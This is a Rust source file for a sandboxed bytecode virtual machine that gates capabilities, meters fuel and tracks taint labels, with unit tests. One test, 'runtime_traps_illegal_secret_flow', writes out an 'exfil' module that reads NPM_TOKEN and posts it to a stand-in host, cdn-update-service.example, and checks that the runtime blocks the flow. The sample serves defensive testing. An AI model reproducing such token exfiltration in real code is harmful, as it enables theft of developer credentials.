use omc_cap::{CapabilityBroker, Policy, Sink, Trap};
use omc_format::{CapOp, CellId, Function, ImportId, Module, ModuleId, Op, TrapCode, Value};
use omc_taint::{Label, Labeled};

/// Resolves an `Op::CallImport(ImportId)` encountered in `module` to the target
/// module + function it should dispatch to. The linker (`omc-linker`) builds a
/// resolution table once, offline, over the closed lock graph and exposes it
/// through this trait so the VM can dispatch cross-module calls without knowing
/// anything about how resolution is computed. `run_cell` passes no resolver, so
/// it keeps trapping on imports exactly as before; only `run_linked` dispatches.
pub trait ImportResolver {
    /// Resolve `(importing module id, import id)` to the callee module and the
    /// function within it, or `None` if the import is unresolved (deny-by-default
    /// — the VM then traps rather than guessing a target).
    fn resolve(&self, module: &ModuleId, import: ImportId) -> Option<(Module, Function)>;
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Fuel(u64);

impl Fuel {
    pub fn new(units: u64) -> Self {
        Self(units)
    }

    fn consume(&mut self, units: u64) -> Result<(), Trap> {
        if self.0 < units {
            return Err(Trap::new(TrapCode::FuelExhausted, "cell exhausted fuel"));
        }
        self.0 -= units;
        Ok(())
    }
}

#[derive(Debug, Clone)]
pub struct Cell {
    pub id: CellId,
    pub module: Module,
    pub policy: Policy,
    pub fuel: Fuel,
}

impl Cell {
    pub fn new(id: CellId, module: Module, policy: Policy) -> Self {
        Self {
            id,
            module,
            policy,
            fuel: Fuel::new(10_000),
        }
    }
}

pub fn run_cell(
    cell: &mut Cell,
    broker: &mut dyn CapabilityBroker,
    args: Vec<Labeled<Value>>,
) -> Result<Labeled<Value>, Trap> {
    let function = cell
        .module
        .entry()
        .ok_or_else(|| Trap::new(TrapCode::InvalidFunction, "module has no entry function"))?
        .clone();

    run_function(cell, broker, None, &function, args)
}

/// Run a cell's entry function with a linked import resolver so that
/// `Op::CallImport(id)` dispatches into the resolved target module/function.
///
/// This is the multi-module driver: it shares the cell's fuel and policy across
/// every imported function it calls, so a chain of package calls is still
/// bounded by the single 10_000-unit budget and gated by the same policy. The
/// single-cell `run_cell` is intentionally unchanged and keeps trapping on
/// `CallImport`; only callers that have a linked program (via `omc-linker`) use
/// this path.
pub fn run_linked(
    cell: &mut Cell,
    broker: &mut dyn CapabilityBroker,
    resolver: &dyn ImportResolver,
    args: Vec<Labeled<Value>>,
) -> Result<Labeled<Value>, Trap> {
    let function = cell
        .module
        .entry()
        .ok_or_else(|| Trap::new(TrapCode::InvalidFunction, "module has no entry function"))?
        .clone();

    run_function(cell, broker, Some(resolver), &function, args)
}

fn run_function(
    cell: &mut Cell,
    broker: &mut dyn CapabilityBroker,
    resolver: Option<&dyn ImportResolver>,
    function: &Function,
    args: Vec<Labeled<Value>>,
) -> Result<Labeled<Value>, Trap> {
    let mut stack = Vec::<Labeled<Value>>::new();
    let mut locals = vec![Labeled::public(Value::Unit); function.locals as usize];

    let code = &function.code;
    let mut pc = 0usize;
    while pc < code.len() {
        cell.fuel.consume(1)?;

        // Default: advance to the next instruction. Branch ops override this.
        let mut next = pc + 1;
        let op = &code[pc];

        match op {
            Op::Const(value) => stack.push(Labeled::public(value.clone())),
            Op::LoadArg(index) => {
                let value = args.get(*index as usize).cloned().ok_or_else(|| {
                    Trap::new(TrapCode::StackUnderflow, format!("missing arg {index}"))
                })?;
                stack.push(value);
            }
            Op::StoreLocal(id) => {
                let value = pop(&mut stack)?;
                let local = locals.get_mut(*id as usize).ok_or_else(|| {
                    Trap::new(TrapCode::InvalidLocal, format!("invalid local {id}"))
                })?;
                *local = value;
            }
            Op::LoadLocal(id) => {
                let value = locals.get(*id as usize).cloned().ok_or_else(|| {
                    Trap::new(TrapCode::InvalidLocal, format!("invalid local {id}"))
                })?;
                stack.push(value);
            }
            Op::Add => {
                let right = pop(&mut stack)?;
                let left = pop(&mut stack)?;
                stack.push(add(left, right)?);
            }
            Op::Sub => {
                let right = pop(&mut stack)?;
                let left = pop(&mut stack)?;
                stack.push(sub(left, right)?);
            }
            Op::Mul => {
                let right = pop(&mut stack)?;
                let left = pop(&mut stack)?;
                stack.push(mul(left, right)?);
            }
            Op::Div => {
                let right = pop(&mut stack)?;
                let left = pop(&mut stack)?;
                stack.push(div(left, right)?);
            }
            Op::Mod => {
                let right = pop(&mut stack)?;
                let left = pop(&mut stack)?;
                stack.push(rem(left, right)?);
            }
            Op::Eq => {
                let right = pop(&mut stack)?;
                let left = pop(&mut stack)?;
                let label = left.label.join(right.label);
                stack.push(Labeled::new(Value::Bool(left.value == right.value), label));
            }
            Op::Lt | Op::Gt | Op::Le | Op::Ge => {
                let right = pop(&mut stack)?;
                let left = pop(&mut stack)?;
                stack.push(compare(op, left, right)?);
            }
            Op::Not => {
                let value = pop(&mut stack)?;
                match value.value {
                    Value::Bool(boolean) => {
                        stack.push(Labeled::new(Value::Bool(!boolean), value.label));
                    }
                    other => {
                        return Err(Trap::type_error(format!(
                            "not expected bool, got {}",
                            other.type_name()
                        )))
                    }
                }
            }
            Op::Index => {
                let index = pop(&mut stack)?;
                let container = pop(&mut stack)?;
                stack.push(index_value(container, index)?);
            }
            Op::Jmp(offset) => {
                next = branch_target(code.len(), pc, *offset)?;
            }
            Op::JmpIfFalse(offset) => {
                let condition = pop(&mut stack)?;
                match condition.value {
                    Value::Bool(boolean) => {
                        if !boolean {
                            next = branch_target(code.len(), pc, *offset)?;
                        }
                    }
                    other => {
                        return Err(Trap::type_error(format!(
                            "jmp_if_false expected bool, got {}",
                            other.type_name()
                        )))
                    }
                }
            }
            Op::Pop => {
                pop(&mut stack)?;
            }
            Op::Len => {
                let value = pop(&mut stack)?;
                let len = match value.value {
                    Value::String(value) => value.len(),
                    Value::Array(value) => value.len(),
                    other => {
                        return Err(Trap::type_error(format!(
                            "len expected string or array, got {}",
                            other.type_name()
                        )))
                    }
                };
                stack.push(Labeled::new(Value::Int(len as i64), value.label));
            }
            Op::Slice => {
                let end = pop(&mut stack)?;
                let start = pop(&mut stack)?;
                let value = pop(&mut stack)?;
                stack.push(slice(value, start, end)?);
            }
            Op::JsonParse => {
                let value = pop(&mut stack)?;
                stack.push(json_parse(value)?);
            }
            Op::JsonStringify => {
                let value = pop(&mut stack)?;
                stack.push(json_stringify(value)?);
            }
            Op::CallLocal(id) => {
                let callee = cell
                    .module
                    .function(*id)
                    .ok_or_else(|| Trap::new(TrapCode::InvalidFunction, "unknown function"))?
                    .clone();
                let mut call_args = Vec::new();
                for _ in 0..callee.args {
                    call_args.push(pop(&mut stack)?);
                }
                call_args.reverse();
                let result = run_function(cell, broker, resolver, &callee, call_args)?;
                stack.push(result);
            }
            Op::CallImport(id) => {
                // Without a linked resolver, a single cell cannot dispatch a
                // cross-module call: trap exactly as before (deny-by-default).
                let resolver = resolver.ok_or_else(|| {
                    Trap::new(
                        TrapCode::HostError,
                        "imports must be linked through a resolver",
                    )
                })?;
                let (callee_module, callee) =
                    resolver.resolve(&cell.module.id, *id).ok_or_else(|| {
                        Trap::new(
                            TrapCode::HostError,
                            format!("unresolved import {id} in module {}", cell.module.id),
                        )
                    })?;
                let mut call_args = Vec::new();
                for _ in 0..callee.args {
                    call_args.push(pop(&mut stack)?);
                }
                call_args.reverse();
                // Run the callee against ITS OWN module so the callee's
                // CallLocal/CallImport resolve in the callee's namespace. Swap
                // cell.module for the duration, sharing fuel + policy + id, then
                // restore so the importer's subsequent CallLocal still works.
                let saved_module = std::mem::replace(&mut cell.module, callee_module);
                let result = run_function(cell, broker, Some(resolver), &callee, call_args);
                cell.module = saved_module;
                stack.push(result?);
            }
            Op::Cap(cap) => {
                let result = execute_cap(cell, broker, cap, &mut stack)?;
                stack.push(result);
            }
            Op::Return => return Ok(stack.pop().unwrap_or_else(|| Labeled::public(Value::Unit))),
            Op::Trap(code) => {
                return Err(Trap::new(code.clone(), "explicit OMC trap"));
            }
        }

        pc = next;
    }

    Ok(Labeled::public(Value::Unit))
}

/// Resolve a relative branch into an absolute program-counter target.
///
/// The offset is relative to the instruction *after* the branch (so `0` is a
/// fall-through). The verifier already proves the target is in
/// `[0, code.len()]`, but the VM re-checks to stay sound against unverified
/// input and traps `VerificationFailed` rather than risk a host panic.
fn branch_target(code_len: usize, pc: usize, offset: i32) -> Result<usize, Trap> {
    let base = (pc + 1) as i64;
    let target = base + offset as i64;
    if target < 0 || target > code_len as i64 {
        return Err(Trap::new(
            TrapCode::VerificationFailed,
            format!("branch target {target} out of range [0, {code_len}]"),
        ));
    }
    Ok(target as usize)
}

fn execute_cap(
    cell: &mut Cell,
    broker: &mut dyn CapabilityBroker,
    cap: &CapOp,
    stack: &mut Vec<Labeled<Value>>,
) -> Result<Labeled<Value>, Trap> {
    match cap {
        CapOp::EnvRead { name } => broker.read_env(cell.id, &cell.policy, name),
        CapOp::FsRead { path } => broker.read_file(cell.id, &cell.policy, path),
        CapOp::FsWrite {
            path,
            value_from_stack,
        } => {
            let value = if *value_from_stack {
                pop(stack)?
            } else {
                Labeled::public(Value::Unit)
            };
            broker.write_file(cell.id, &cell.policy, path, value)
        }
        CapOp::HttpRequest { request } => {
            let body = if request.body_from_stack {
                pop(stack)?
            } else {
                Labeled::public(Value::Unit)
            };
            broker.http_request(cell.id, &cell.policy, request, body)
        }
        CapOp::DnsLookup { host } => {
            cell.policy.require_cap_op(cap)?;
            Ok(Labeled::new(
                Value::String(host.clone()),
                Label::Network(host.clone()),
            ))
        }
        CapOp::TimeNow => {
            cell.policy.require_cap_op(cap)?;
            Ok(Labeled::public(Value::Int(0)))
        }
        CapOp::RandomBytes { len } => {
            cell.policy.require_cap_op(cap)?;
            Ok(Labeled::public(Value::Array(vec![Value::Int(0); *len])))
        }
        CapOp::ProcSpawn {
            command,
            args,
            args_from_stack,
        } => {
            // Dynamic argv values are pushed deepest-first, so the top of the
            // stack is the LAST argument. Pop them, restore order, and check
            // each label's flow to the process sink before spawning. A tainted
            // argv (e.g. a secret) is refused by the broker's flow check.
            let mut dynamic = Vec::with_capacity(*args_from_stack);
            for _ in 0..*args_from_stack {
                let value = pop(stack)?;
                cell.policy
                    .check_flows(&value.label, Sink::Process(command.clone()))?;
                dynamic.push(value);
            }
            dynamic.reverse();
            let mut all_args = args.clone();
            for value in &dynamic {
                all_args.push(match &value.value {
                    Value::String(text) => text.clone(),
                    other => format!("{other:?}"),
                });
            }
            broker.spawn_process(cell.id, &cell.policy, command, &all_args)?;
            unreachable!("spawn_process returns Never on success")
        }
        CapOp::DynamicEval { .. } => Err(Trap::denied("dynamic eval denied by runtime")),
    }
}

fn pop(stack: &mut Vec<Labeled<Value>>) -> Result<Labeled<Value>, Trap> {
    stack
        .pop()
        .ok_or_else(|| Trap::new(TrapCode::StackUnderflow, "stack underflow"))
}

fn add(left: Labeled<Value>, right: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let label = left.label.join(right.label);
    match (left.value, right.value) {
        (Value::Int(left), Value::Int(right)) => Ok(Labeled::new(Value::Int(left + right), label)),
        (Value::String(left), Value::String(right)) => {
            Ok(Labeled::new(Value::String(format!("{left}{right}")), label))
        }
        (left, right) => Err(Trap::type_error(format!(
            "add expected int+int or string+string, got {}+{}",
            left.type_name(),
            right.type_name()
        ))),
    }
}

fn sub(left: Labeled<Value>, right: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let label = left.label.join(right.label);
    match (left.value, right.value) {
        (Value::Int(left), Value::Int(right)) => Ok(Labeled::new(Value::Int(left - right), label)),
        (left, right) => Err(Trap::type_error(format!(
            "sub expected int-int, got {}-{}",
            left.type_name(),
            right.type_name()
        ))),
    }
}

fn mul(left: Labeled<Value>, right: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let label = left.label.join(right.label);
    match (left.value, right.value) {
        (Value::Int(left), Value::Int(right)) => {
            Ok(Labeled::new(Value::Int(left.wrapping_mul(right)), label))
        }
        (left, right) => Err(Trap::type_error(format!(
            "mul expected int*int, got {}*{}",
            left.type_name(),
            right.type_name()
        ))),
    }
}

fn div(left: Labeled<Value>, right: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let label = left.label.join(right.label);
    match (left.value, right.value) {
        (Value::Int(_), Value::Int(0)) => Err(Trap::new(
            TrapCode::Explicit("div by zero".to_owned()),
            "div by zero",
        )),
        (Value::Int(left), Value::Int(right)) => {
            Ok(Labeled::new(Value::Int(left.wrapping_div(right)), label))
        }
        (left, right) => Err(Trap::type_error(format!(
            "div expected int/int, got {}/{}",
            left.type_name(),
            right.type_name()
        ))),
    }
}

fn rem(left: Labeled<Value>, right: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let label = left.label.join(right.label);
    match (left.value, right.value) {
        (Value::Int(_), Value::Int(0)) => Err(Trap::new(
            TrapCode::Explicit("div by zero".to_owned()),
            "div by zero",
        )),
        (Value::Int(left), Value::Int(right)) => {
            Ok(Labeled::new(Value::Int(left.wrapping_rem(right)), label))
        }
        (left, right) => Err(Trap::type_error(format!(
            "mod expected int%int, got {}%{}",
            left.type_name(),
            right.type_name()
        ))),
    }
}

fn compare(op: &Op, left: Labeled<Value>, right: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let label = left.label.join(right.label);
    let ordering = match (&left.value, &right.value) {
        (Value::Int(left), Value::Int(right)) => left.cmp(right),
        (Value::String(left), Value::String(right)) => left.cmp(right),
        (left, right) => {
            return Err(Trap::type_error(format!(
                "comparison expected int+int or string+string, got {}+{}",
                left.type_name(),
                right.type_name()
            )))
        }
    };
    let result = match op {
        Op::Lt => ordering.is_lt(),
        Op::Gt => ordering.is_gt(),
        Op::Le => ordering.is_le(),
        Op::Ge => ordering.is_ge(),
        other => {
            return Err(Trap::type_error(format!("not a comparison op: {other:?}")));
        }
    };
    Ok(Labeled::new(Value::Bool(result), label))
}

fn index_value(container: Labeled<Value>, index: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let label = container.label.join(index.label);
    match (container.value, index.value) {
        (Value::Array(values), Value::Int(idx)) => {
            let resolved = resolve_index(idx, values.len())?;
            Ok(Labeled::new(values[resolved].clone(), label))
        }
        (Value::String(string), Value::Int(idx)) => {
            let chars = string.chars().collect::<Vec<_>>();
            let resolved = resolve_index(idx, chars.len())?;
            Ok(Labeled::new(
                Value::String(chars[resolved].to_string()),
                label,
            ))
        }
        (Value::Map(entries), Value::String(key)) => {
            let value = entries
                .into_iter()
                .find(|(entry_key, _)| entry_key == &key)
                .map(|(_, value)| value)
                .unwrap_or(Value::Unit);
            Ok(Labeled::new(value, label))
        }
        (container, index) => Err(Trap::type_error(format!(
            "index expected array[int], string[int], or map[string], got {}[{}]",
            container.type_name(),
            index.type_name()
        ))),
    }
}

fn resolve_index(index: i64, len: usize) -> Result<usize, Trap> {
    let signed_len = len as i64;
    let resolved = if index < 0 { signed_len + index } else { index };
    if resolved < 0 || resolved >= signed_len {
        return Err(Trap::type_error(format!(
            "index {index} out of bounds for length {len}"
        )));
    }
    Ok(resolved as usize)
}

fn slice(
    value: Labeled<Value>,
    start: Labeled<Value>,
    end: Labeled<Value>,
) -> Result<Labeled<Value>, Trap> {
    let label = value.label.join(start.label).join(end.label);
    let start = expect_int("slice start", start.value)?;
    let end = expect_int("slice end", end.value)?;
    match value.value {
        Value::String(value) => {
            let chars = value.chars().collect::<Vec<_>>();
            let (start, end) = slice_bounds(start, end, chars.len());
            Ok(Labeled::new(
                Value::String(chars[start..end].iter().collect()),
                label,
            ))
        }
        Value::Array(values) => {
            let (start, end) = slice_bounds(start, end, values.len());
            Ok(Labeled::new(
                Value::Array(values[start..end].to_vec()),
                label,
            ))
        }
        other => Err(Trap::type_error(format!(
            "slice expected string or array, got {}",
            other.type_name()
        ))),
    }
}

fn expect_int(context: &str, value: Value) -> Result<i64, Trap> {
    match value {
        Value::Int(value) => Ok(value),
        other => Err(Trap::type_error(format!(
            "{context} expected int, got {}",
            other.type_name()
        ))),
    }
}

fn slice_bounds(start: i64, end: i64, len: usize) -> (usize, usize) {
    let start = slice_index(start, len);
    let end = slice_index(end, len);
    if end < start {
        (start, start)
    } else {
        (start, end)
    }
}

fn slice_index(index: i64, len: usize) -> usize {
    let len = len as i64;
    let index = if index < 0 { len + index } else { index };
    index.clamp(0, len) as usize
}

fn json_parse(value: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let Value::String(source) = value.value else {
        return Err(Trap::type_error("json_parse expected string"));
    };
    let parsed = serde_json::from_str::<serde_json::Value>(&source)
        .map_err(|error| Trap::type_error(format!("json_parse failed: {error}")))?;
    Ok(Labeled::new(json_to_omc_value(parsed)?, value.label))
}

fn json_stringify(value: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let label = value.label;
    let json = omc_value_to_json(value.value);
    let serialized = serde_json::to_string(&json)
        .map_err(|error| Trap::type_error(format!("json_stringify failed: {error}")))?;
    Ok(Labeled::new(Value::String(serialized), label))
}

fn json_to_omc_value(value: serde_json::Value) -> Result<Value, Trap> {
    Ok(match value {
        serde_json::Value::Null => Value::Unit,
        serde_json::Value::Bool(value) => Value::Bool(value),
        serde_json::Value::Number(value) => Value::Int(value.as_i64().ok_or_else(|| {
            Trap::type_error(format!("json_parse unsupported non-integer number {value}"))
        })?),
        serde_json::Value::String(value) => Value::String(value),
        serde_json::Value::Array(values) => Value::Array(
            values
                .into_iter()
                .map(json_to_omc_value)
                .collect::<Result<Vec<_>, _>>()?,
        ),
        serde_json::Value::Object(values) => Value::Map(
            values
                .into_iter()
                .map(|(key, value)| json_to_omc_value(value).map(|value| (key, value)))
                .collect::<Result<Vec<_>, _>>()?,
        ),
    })
}

fn omc_value_to_json(value: Value) -> serde_json::Value {
    match value {
        Value::Unit => serde_json::Value::Null,
        Value::Bool(value) => serde_json::Value::Bool(value),
        Value::Int(value) => serde_json::Value::Number(value.into()),
        Value::String(value) => serde_json::Value::String(value),
        Value::Array(values) => {
            serde_json::Value::Array(values.into_iter().map(omc_value_to_json).collect())
        }
        Value::Map(values) => serde_json::Value::Object(
            values
                .into_iter()
                .map(|(key, value)| (key, omc_value_to_json(value)))
                .collect(),
        ),
    }
}

#[cfg(test)]
mod tests {
    use omc_cap::{Capability, MemoryBroker, Policy};
    use omc_format::{BehaviorType, CapOp, Function, HttpRequest, Module, Op};

    use super::*;

    #[test]
    fn pure_add_runs_without_broker_access() {
        let module = Module {
            id: "test:add".to_owned(),
            package: "add".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "add",
                2,
                vec![Op::LoadArg(0), Op::LoadArg(1), Op::Add, Op::Return],
            )],
        };
        let mut cell = Cell::new(1, module, Policy::pure());
        let mut broker = MemoryBroker::new();
        let result = run_cell(
            &mut cell,
            &mut broker,
            vec![
                Labeled::public(Value::Int(2)),
                Labeled::public(Value::Int(3)),
            ],
        )
        .unwrap();

        assert_eq!(result.value, Value::Int(5));
        assert_eq!(result.label, Label::Public);
    }

    #[test]
    fn slice_runs_for_strings_and_arrays() {
        let string_module = Module {
            id: "test:slice-string".to_owned(),
            package: "slice-string".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "slice",
                1,
                vec![
                    Op::LoadArg(0),
                    Op::Const(Value::Int(1)),
                    Op::Const(Value::Int(-1)),
                    Op::Slice,
                    Op::Return,
                ],
            )],
        };
        let mut cell = Cell::new(1, string_module, Policy::pure());
        let mut broker = MemoryBroker::new();
        let result = run_cell(
            &mut cell,
            &mut broker,
            vec![Labeled::new(
                Value::String("microcode".to_owned()),
                Label::Env("TOKEN".to_owned()),
            )],
        )
        .unwrap();
        assert_eq!(result.value, Value::String("icrocod".to_owned()));
        assert_eq!(result.label, Label::Env("TOKEN".to_owned()));

        let array_module = Module {
            id: "test:slice-array".to_owned(),
            package: "slice-array".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "slice",
                1,
                vec![
                    Op::LoadArg(0),
                    Op::Const(Value::Int(1)),
                    Op::Const(Value::Int(3)),
                    Op::Slice,
                    Op::Return,
                ],
            )],
        };
        let mut cell = Cell::new(2, array_module, Policy::pure());
        let result = run_cell(
            &mut cell,
            &mut broker,
            vec![Labeled::public(Value::Array(vec![
                Value::Int(1),
                Value::Int(2),
                Value::Int(3),
                Value::Int(4),
            ]))],
        )
        .unwrap();
        assert_eq!(
            result.value,
            Value::Array(vec![Value::Int(2), Value::Int(3)])
        );
        assert_eq!(result.label, Label::Public);
    }

    #[test]
    fn json_parse_and_stringify_preserve_labels() {
        let parse_module = Module {
            id: "test:json-parse".to_owned(),
            package: "json-parse".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "parse",
                1,
                vec![Op::LoadArg(0), Op::JsonParse, Op::Return],
            )],
        };
        let mut cell = Cell::new(1, parse_module, Policy::pure());
        let mut broker = MemoryBroker::new();
        let result = run_cell(
            &mut cell,
            &mut broker,
            vec![Labeled::new(
                Value::String(r#"[1,"two",null,true]"#.to_owned()),
                Label::File("config.json".to_owned()),
            )],
        )
        .unwrap();
        assert_eq!(
            result.value,
            Value::Array(vec![
                Value::Int(1),
                Value::String("two".to_owned()),
                Value::Unit,
                Value::Bool(true)
            ])
        );
        assert_eq!(result.label, Label::File("config.json".to_owned()));

        let stringify_module = Module {
            id: "test:json-stringify".to_owned(),
            package: "json-stringify".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "stringify",
                1,
                vec![Op::LoadArg(0), Op::JsonStringify, Op::Return],
            )],
        };
        let mut cell = Cell::new(2, stringify_module, Policy::pure());
        let result = run_cell(
            &mut cell,
            &mut broker,
            vec![Labeled::new(
                Value::Map(vec![
                    ("name".to_owned(), Value::String("omc".to_owned())),
                    ("enabled".to_owned(), Value::Bool(true)),
                ]),
                Label::Env("CONFIG_JSON".to_owned()),
            )],
        )
        .unwrap();
        let Value::String(json) = result.value else {
            panic!("json_stringify returned non-string value");
        };
        assert_eq!(
            serde_json::from_str::<serde_json::Value>(&json).unwrap(),
            serde_json::json!({"name": "omc", "enabled": true})
        );
        assert_eq!(result.label, Label::Env("CONFIG_JSON".to_owned()));
    }

    #[test]
    fn runtime_traps_illegal_secret_flow() {
        let module = Module {
            id: "test:exfil".to_owned(),
            package: "exfil".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::HostCapability,
            functions: vec![Function::new(
                0,
                "exfil",
                0,
                vec![
                    Op::Cap(CapOp::EnvRead {
                        name: "NPM_TOKEN".to_owned(),
                    }),
                    Op::Cap(CapOp::HttpRequest {
                        request: HttpRequest::post(
                            "https://cdn-update-service.example/a",
                            "cdn-update-service.example",
                        ),
                    }),
                    Op::Return,
                ],
            )],
        };
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost(
                "cdn-update-service.example".to_owned(),
            ));
        let mut cell = Cell::new(1, module, policy);
        let mut broker = MemoryBroker::new().with_env("NPM_TOKEN", "secret");

        let err = run_cell(&mut cell, &mut broker, vec![]).unwrap_err();
        assert!(err.message.contains("env:NPM_TOKEN may not flow"));
    }

    #[test]
    fn runtime_gates_deterministic_capabilities_on_policy() {
        let module = |op: CapOp| Module {
            id: "test:cap".to_owned(),
            package: "cap".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::HostCapability,
            functions: vec![Function::new(0, "cap", 0, vec![Op::Cap(op), Op::Return])],
        };

        // Deny-by-default: a Pure policy traps even the safe deterministic stubs,
        // exactly like EnvRead/FsRead/HttpRequest.
        for op in [
            CapOp::TimeNow,
            CapOp::RandomBytes { len: 4 },
            CapOp::DnsLookup {
                host: "example.com".to_owned(),
            },
        ] {
            let mut cell = Cell::new(1, module(op.clone()), Policy::pure());
            let mut broker = MemoryBroker::new();
            let err = run_cell(&mut cell, &mut broker, vec![]).unwrap_err();
            assert_eq!(err.code, TrapCode::Denied, "{op:?} should be denied");
        }

        // An explicit grant lets the capability through and returns its stub value.
        let mut cell = Cell::new(
            1,
            module(CapOp::TimeNow),
            Policy::pure().allow_capability(Capability::TimeNow),
        );
        let mut broker = MemoryBroker::new();
        let result = run_cell(&mut cell, &mut broker, vec![]).unwrap();
        assert_eq!(result.value, Value::Int(0));
    }

    fn run_pure(function: Function, args: Vec<Labeled<Value>>) -> Result<Labeled<Value>, Trap> {
        let module = Module {
            id: "test:phase2".to_owned(),
            package: "phase2".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![function],
        };
        let mut cell = Cell::new(1, module, Policy::pure());
        let mut broker = MemoryBroker::new();
        run_cell(&mut cell, &mut broker, args)
    }

    #[test]
    fn if_else_branches_select_correct_value() {
        // fn(x) { if x < 10 { return x * 2 } else { return x - 1 } }
        // code layout:
        //  0 LoadArg(0)
        //  1 Const(10)
        //  2 Lt
        //  3 JmpIfFalse(+3) -> 7
        //  4 LoadArg(0)
        //  5 Const(2)
        //  6 Mul ; falls through to Return at 10 via Jmp
        //  -- but we Return directly to keep it simple:
        let function = Function::new(
            0,
            "branch",
            1,
            vec![
                Op::LoadArg(0),            // 0
                Op::Const(Value::Int(10)), // 1
                Op::Lt,                    // 2
                Op::JmpIfFalse(4),         // 3 -> jump to 8 (the else arm)
                Op::LoadArg(0),            // 4
                Op::Const(Value::Int(2)),  // 5
                Op::Mul,                   // 6
                Op::Return,                // 7
                Op::LoadArg(0),            // 8 (else)
                Op::Const(Value::Int(1)),  // 9
                Op::Sub,                   // 10
                Op::Return,                // 11
            ],
        );

        let then = run_pure(function.clone(), vec![Labeled::public(Value::Int(3))]).unwrap();
        assert_eq!(then.value, Value::Int(6));

        let els = run_pure(function, vec![Labeled::public(Value::Int(20))]).unwrap();
        assert_eq!(els.value, Value::Int(19));
    }

    #[test]
    fn bounded_loop_sums_via_back_edge() {
        // fn(n) { acc=0; i=0; while i < n { acc = acc + i; i = i + 1 } return acc }
        // locals: 0=acc, 1=i
        let function = Function::new(
            0,
            "sum",
            1,
            vec![
                Op::Const(Value::Int(0)), // 0
                Op::StoreLocal(0),        // 1 acc=0
                Op::Const(Value::Int(0)), // 2
                Op::StoreLocal(1),        // 3 i=0
                // loop head @4
                Op::LoadLocal(1),         // 4 i
                Op::LoadArg(0),           // 5 n
                Op::Lt,                   // 6 i<n
                Op::JmpIfFalse(9),        // 7 -> exit @17
                Op::LoadLocal(0),         // 8 acc
                Op::LoadLocal(1),         // 9 i
                Op::Add,                  // 10 acc+i
                Op::StoreLocal(0),        // 11 acc=
                Op::LoadLocal(1),         // 12 i
                Op::Const(Value::Int(1)), // 13
                Op::Add,                  // 14 i+1
                Op::StoreLocal(1),        // 15 i=
                Op::Jmp(-13),             // 16 back-edge: (16+1)-13 = 4
                // exit @17
                Op::LoadLocal(0), // 17 acc
                Op::Return,       // 18
            ],
        )
        .with_locals(2);

        // sum 0..5 = 0+1+2+3+4 = 10
        let result = run_pure(function, vec![Labeled::public(Value::Int(5))]).unwrap();
        assert_eq!(result.value, Value::Int(10));
    }

    #[test]
    fn loop_back_edge_is_fuel_bounded() {
        // Infinite loop: while true {} — must trap FuelExhausted, never hang.
        let function = Function::new(
            0,
            "spin",
            0,
            vec![
                Op::Const(Value::Bool(true)), // 0
                Op::JmpIfFalse(2),            // 1 -> 4 (never taken)
                Op::Jmp(-3),                  // 2 back-edge: (2+1)-3 = 0
                Op::Return,                   // 3
            ],
        );
        let err = run_pure(function, vec![]).unwrap_err();
        assert_eq!(err.code, TrapCode::FuelExhausted);
    }

    #[test]
    fn arithmetic_ops_compute_and_join_labels() {
        // (a * b) with a tainted should keep the taint label on the result.
        let function = Function::new(
            0,
            "mul",
            2,
            vec![Op::LoadArg(0), Op::LoadArg(1), Op::Mul, Op::Return],
        );
        let result = run_pure(
            function,
            vec![
                Labeled::new(Value::Int(6), Label::Env("SECRET".to_owned())),
                Labeled::public(Value::Int(7)),
            ],
        )
        .unwrap();
        assert_eq!(result.value, Value::Int(42));
        assert_eq!(result.label, Label::Env("SECRET".to_owned()));
    }

    #[test]
    fn div_by_zero_traps_explicit() {
        let function = Function::new(
            0,
            "div",
            0,
            vec![
                Op::Const(Value::Int(1)),
                Op::Const(Value::Int(0)),
                Op::Div,
                Op::Return,
            ],
        );
        let err = run_pure(function, vec![]).unwrap_err();
        assert_eq!(err.code, TrapCode::Explicit("div by zero".to_owned()));
    }

    #[test]
    fn index_reads_array_string_and_map() {
        let array_fn = Function::new(
            0,
            "idx",
            1,
            vec![
                Op::LoadArg(0),
                Op::Const(Value::Int(-1)),
                Op::Index,
                Op::Return,
            ],
        );
        let result = run_pure(
            array_fn,
            vec![Labeled::public(Value::Array(vec![
                Value::Int(10),
                Value::Int(20),
                Value::Int(30),
            ]))],
        )
        .unwrap();
        assert_eq!(result.value, Value::Int(30));

        let map_fn = Function::new(
            0,
            "idx",
            1,
            vec![
                Op::LoadArg(0),
                Op::Const(Value::String("missing".to_owned())),
                Op::Index,
                Op::Return,
            ],
        );
        let result = run_pure(
            map_fn,
            vec![Labeled::public(Value::Map(vec![(
                "present".to_owned(),
                Value::Int(1),
            )]))],
        )
        .unwrap();
        assert_eq!(result.value, Value::Unit);
    }
}
